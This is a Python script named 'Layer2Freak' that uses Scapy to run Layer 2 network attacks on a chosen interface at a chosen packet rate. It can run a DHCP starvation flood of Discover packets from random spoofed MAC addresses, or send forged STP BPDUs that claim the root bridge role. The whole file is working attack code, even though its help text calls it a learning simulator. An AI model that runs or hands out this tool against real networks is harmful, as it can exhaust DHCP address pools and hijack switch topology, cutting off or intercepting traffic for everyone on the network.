import argparse
import logging
import sys
import time
import random
from scapy.all import *
import threading
import netifaces

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('layer2freak.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class Layer2Freak:
    def __init__(self, interface, attack_type, target_ip=None, rate=1, quiet=False):
        self.interface = interface
        self.attack_type = attack_type.lower()
        self.target_ip = target_ip if target_ip else "192.168.1.1"
        self.rate = rate  # Packets per second
        self.quiet = quiet
        self.running = False
        self.packet_count = 0
        self.output_file = f"layer2freak_results_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        conf.iface = interface
        conf.verb = 0  # Suppress Scapy output

    def get_random_mac(self):
        """Generate a random MAC address."""
        return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

    def get_local_ip(self):
        """Get the local IP address for the interface."""
        try:
            addrs = netifaces.ifaddresses(self.interface)
            return addrs[netifaces.AF_INET][0]['addr']
        except Exception as e:
            logging.error(f"Error getting local IP: {str(e)}")
            sys.exit(1)

    def craft_dhcp_discover(self):
        """Craft a DHCP Discover packet with a spoofed MAC."""
        try:
            mac = self.get_random_mac()
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(chaddr=[mac2str(mac)], xid=random.randint(1, 1000000)) / \
                  DHCP(options=[("message-type", "discover"), ("end")])
            return pkt
        except Exception as e:
            logging.error(f"Error crafting DHCP packet: {str(e)}")
            return None

    def craft_stp_bpdu(self):
        """Craft an STP Configuration BPDU to claim root bridge."""
        try:
            mac = self.get_random_mac()
            pkt = Ether(src=mac, dst="01:80:c2:00:00:00") / \
                  LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
                  STP(bpdutype=0, bpduflags=0x01, rootid=32768, rootmac=mac,
                      pathcost=0, bridgeid=32768, bridgemac=mac, portid=0x8001,
                      msgage=0, maxage=20, hellotime=2, fwddelay=15)
            return pkt
        except Exception as e:
            logging.error(f"Error crafting STP packet: {str(e)}")
            return None

    def send_packet(self):
        """Send the appropriate packet based on attack type."""
        try:
            if self.attack_type == "dhcp":
                pkt = self.craft_dhcp_discover()
            elif self.attack_type == "stp":
                pkt = self.craft_stp_bpdu()
            else:
                logging.error(f"Unsupported attack type: {self.attack_type}")
                return
            if pkt:
                sendp(pkt, iface=self.interface, count=1, inter=0)
                self.packet_count += 1
                logging.info(f"Sent packet #{self.packet_count}: {pkt.summary()}")
                with open(self.output_file, 'a') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {pkt.summary()}\n")
        except Exception as e:
            logging.error(f"Error sending packet: {str(e)}")

    def start_attack(self):
        """Start the Layer 2 attack at the specified rate."""
        self.running = True
        logging.info(f"Starting Layer2Freak: Attack={self.attack_type}, Target={self.target_ip}, Rate={self.rate}/s")
        try:
            while self.running:
                self.send_packet()
                time.sleep(1.0 / self.rate)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the attack and save results."""
        self.running = False
        logging.info(f"Layer2Freak stopped. Total packets sent: {self.packet_count}")
        with open(self.output_file, 'a') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Total packets sent: {self.packet_count}\n")
        logging.info(f"Results saved to {self.output_file}")

    def start(self):
        """Start the attack in a separate thread."""
        if not self.check_root():
            logging.error("This tool requires root privileges. Run with sudo.")
            sys.exit(1)
        attack_thread = threading.Thread(target=self.start_attack)
        attack_thread.start()
        try:
            attack_thread.join()
        except KeyboardInterrupt:
            self.stop()

    def check_root(self):
        """Check if the script is running with root privileges."""
        return os.geteuid() == 0

def main():
    parser = argparse.ArgumentParser(description="Layer2Freak - A tool to simulate Layer 2 attacks for learning.")
    parser.add_argument('-i', '--interface', required=True, help='Network interface (e.g., eth0)')
    parser.add_argument('-a', '--attack-type', required=True, choices=['dhcp', 'stp'], help='Attack type (dhcp or stp)')
    parser.add_argument('-t', '--target-ip', default='192.168.1.1', help='Target IP address (default: 192.168.1.1)')
    parser.add_argument('-r', '--rate', type=float, default=1, help='Packet send rate (packets/second, default: 1)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('layer2freak.log')]

    freak = Layer2Freak(
        interface=args.interface,
        attack_type=args.attack_type,
        target_ip=args.target_ip,
        rate=args.rate,
        quiet=args.quiet
    )

    try:
        freak.start()
    except KeyboardInterrupt:
        freak.stop()

if __name__ == "__main__":
    main()